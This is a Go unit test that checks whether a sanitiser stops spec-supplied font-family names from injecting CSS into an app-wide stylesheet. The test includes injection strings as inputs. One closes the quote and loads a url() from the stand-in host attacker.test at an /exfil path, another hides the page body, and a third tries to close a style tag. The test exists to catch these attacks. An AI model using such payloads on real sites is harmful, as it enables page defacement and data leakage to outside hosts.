package appgen

import (
	"strings"
	"testing"
)

// Property: a spec-derived font family must not escape the CSS string
// literal it is interpolated into. Edge-trimming quotes missed an
// interior quote, which closed `font-family: '…'` and appended
// attacker-chosen rules to the app-wide stylesheet.
func TestFontFamilyCannotInjectCSS(t *testing.T) {
	for _, in := range []string{
		`Evil'} body{background:url('https://attacker.test/exfil')}@font-face{font-family:'z`,
		`Inter"; } body { display:none } .x{`,
		"Inter\\3c/style\\3e",
	} {
		got := appSpecFontFamilyName(in)
		if strings.ContainsAny(got, `'"{}();\/<>:`) {
			t.Errorf("font family %q survived sanitisation as %q", in, got)
		}
	}
	// Real families are untouched.
	for in, want := range map[string]string{
		"Inter":                     "Inter",
		"'Playfair Display', serif": "Playfair Display",
		"IBM Plex Sans":             "IBM Plex Sans",
	} {
		if got := appSpecFontFamilyName(in); got != want {
			t.Errorf("appSpecFontFamilyName(%q) = %q, want %q", in, got, want)
		}
	}
}
